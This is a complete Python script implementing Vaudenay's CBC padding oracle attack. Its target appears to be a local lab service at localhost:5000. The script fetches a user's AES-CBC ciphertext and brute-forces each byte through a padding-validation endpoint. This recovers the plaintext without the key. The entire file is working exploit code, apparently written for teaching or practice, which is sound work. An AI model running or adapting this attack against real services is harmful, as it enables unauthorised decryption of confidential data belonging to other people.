#!/usr/bin/env python3
"""
Vaudenay Attack - CBC Padding Oracle

Exploits PKCS#7 padding validation to decrypt AES-CBC ciphertext
without knowing the encryption key.

Attack process:
  1. Retrieve encrypted message from server
  2. Attack each block byte-by-byte from right to left
  3. Use padding oracle to deduce plaintext values
  4. Reconstruct complete message

Usage: python vaudenay_attack.py <username>
"""

import sys
import requests
import base64
from Crypto.Util.Padding import unpad

BASE_URL = "http://localhost:5000"
BLOCK_SIZE = 16

def get_encrypted_message(username):
    """Retrieve encrypted message for user"""
    response = requests.post(
        f"{BASE_URL}/api/encrypt",
        json={"username": username},
        headers={"Content-Type": "application/json"}
    )
    response.raise_for_status()
    
    data = response.json()
    iv = base64.b64decode(data["iv"])
    ciphertext = base64.b64decode(data["ciphertext"])
    
    return iv, ciphertext

def check_padding_valid(ciphertext, username):
    """Query padding oracle to check if padding is valid"""
    iv = ciphertext[:BLOCK_SIZE]
    ct = ciphertext[BLOCK_SIZE:]
    
    payload = {
        "iv": base64.b64encode(iv).decode(),
        "ciphertext": base64.b64encode(ct).decode(),
        "username": username
    }
    
    response = requests.post(
        f"{BASE_URL}/api/verify_padding",
        json=payload,
        headers={"Content-Type": "application/json"}
    )
    response.raise_for_status()
    
    return response.json().get("valid", False)

def attack_byte(target_block, byte_pos, known_bytes, username):
    """
    Attack single byte at specified position
    
    Args:
        target_block: Ciphertext block being attacked
        byte_pos: Position of byte to attack (0-15, left to right)
        known_bytes: Previously discovered intermediate values
        username: User identifier for oracle queries
    
    Returns:
        Intermediate value of attacked byte
    """
    padding_value = BLOCK_SIZE - byte_pos
    
    print(f"\tByte {byte_pos + 1}/{BLOCK_SIZE} (padding={padding_value}):", end=" ")
    
    # Build attack block
    attack_block = bytearray(BLOCK_SIZE)
    
    # Set known bytes to produce correct padding
    for i in range(byte_pos + 1, BLOCK_SIZE):
        attack_block[i] = known_bytes[i] ^ padding_value
    
    # Try all possible values for current byte
    oracle_queries = 0
    for guess in range(256):
        attack_block[byte_pos] = guess
        
        test_ciphertext = bytes(attack_block) + target_block
        
        oracle_queries += 1
        if check_padding_valid(test_ciphertext, username):
            intermediate_value = guess ^ padding_value
            print(f"0x{intermediate_value:02x} ({oracle_queries} queries)")
            return intermediate_value
    
    print(f"Failed after {oracle_queries} queries")
    raise ValueError(f"Unable to find byte at position {byte_pos}")

def attack_block(target_block, previous_block, username):
    """
    Attack complete block to recover plaintext
    
    Args:
        target_block: Ciphertext block to decrypt
        previous_block: Previous ciphertext block or IV
        username: User identifier
    
    Returns:
        Plaintext bytes of block
    """
    # Store intermediate values from AES decryption
    intermediate_values = [0] * BLOCK_SIZE
    
    # Attack bytes from right to left
    for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
        intermediate_values[byte_pos] = attack_byte(
            target_block, byte_pos, intermediate_values, username
        )
    
    # Calculate plaintext: intermediate XOR previous_block
    plaintext = bytes(
        intermediate_values[i] ^ previous_block[i] 
        for i in range(BLOCK_SIZE)
    )
    
    return plaintext

def vaudenay_attack(username):
    """
    Execute complete padding oracle attack
    
    Args:
        username: Target username
    
    Returns:
        Decrypted message
    """
    print("Starting padding oracle attack...")
    print(f"Target user: {username}\n")
    
    # Retrieve encrypted message
    print("Retrieving encrypted message...")
    iv, ciphertext = get_encrypted_message(username)
    num_blocks = len(ciphertext) // BLOCK_SIZE
    print(f"Received {len(ciphertext)} bytes ({num_blocks} blocks)\n")
    
    # Split ciphertext into blocks
    cipher_blocks = [
        ciphertext[i:i+BLOCK_SIZE] 
        for i in range(0, len(ciphertext), BLOCK_SIZE)
    ]
    
    # Attack each block
    decrypted_blocks = []
    for i, cipher_block in enumerate(cipher_blocks):
        print(f"Attacking block {i+1}/{num_blocks}:")
        
        previous_block = iv if i == 0 else cipher_blocks[i-1]
        
        plaintext_block = attack_block(cipher_block, previous_block, username)
        decrypted_blocks.append(plaintext_block)
        
        print(f"Decrypted: {plaintext_block}\n")
    
    # Assemble result
    plaintext = b''.join(decrypted_blocks)
    
    try:
        # Remove PKCS#7 padding
        message = unpad(plaintext, BLOCK_SIZE, style='pkcs7')
        return message.decode()
    except Exception as e:
        print(f"Warning: Padding removal failed ({e})")
        return plaintext.decode(errors='ignore')

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python vaudenay_attack.py <username>")
        sys.exit(1)
    
    username = sys.argv[1]
    
    try:
        result = vaudenay_attack(username)
        print(f"Decrypted message:\n{result}")
    except Exception as e:
        print(f"\nAttack failed: {e}")
        sys.exit(1)